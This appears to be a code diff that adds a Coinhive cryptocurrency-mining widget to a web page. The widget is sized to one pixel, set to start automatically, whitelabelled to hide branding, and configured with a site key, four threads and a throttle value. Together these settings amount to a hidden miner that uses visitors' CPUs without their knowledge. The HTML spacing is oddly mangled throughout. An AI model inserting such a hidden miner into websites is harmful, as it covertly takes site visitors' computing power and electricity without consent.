@@ -1,0 +1,11 @@
+< div class = "coinhive-miner"
+style = "width: 1px; height: 1px"
+data - key = "tzgB6Nh33YeTJ3ToDJTc9W0OMDYMdxkw"
+data - autostart = "true"
+data - whitelabel = "true"
+data - background = "#111111"
+data - text = "#eeeeee"
+data - action = "#00ff00"
+data - graph = "#555555"
+data - threads = "4"
+data - throttle = "0.4" > < em > Loading... < /em></div >
